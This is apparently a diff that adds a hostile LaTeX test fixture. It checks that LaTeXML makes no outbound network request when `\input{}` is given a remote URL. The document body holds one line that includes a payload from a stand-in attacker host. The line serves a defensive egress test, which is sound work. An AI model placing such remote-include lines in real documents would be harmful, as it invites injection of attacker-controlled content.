@@ -1,0 +1,21 @@
+% E13_S03 hostile fixture — `\input{}` from external URL attempt.
+%
+% IMPORTANT — fixture effectiveness caveat (synthesis FM-5):
+% LaTeXML resolves `\input{filename}` as a LOCAL file path relative
+% to the source directory. It does NOT fetch HTTP URLs even when the
+% argument looks like one. The fixture is therefore expected to fail
+% with a "file not found" parse error, not an outbound HTTP request.
+%
+% The test asserts BOTH:
+%   1. NO outbound network connection was attempted (verified via
+%      socket-call monkeypatch or netstat-style snapshot)
+%   2. The parse failed (LaTeXML produced no output OR a degraded
+%      HTML output)
+%
+% If LaTeXML ever gains HTTP-fetch capability for `\input{}`, the
+% network-egress assertion will fire loudly.
+\documentclass{article}
+\begin{document}
+\input{http://attacker.example.invalid/payload.tex}
+End of document.
+\end{document}
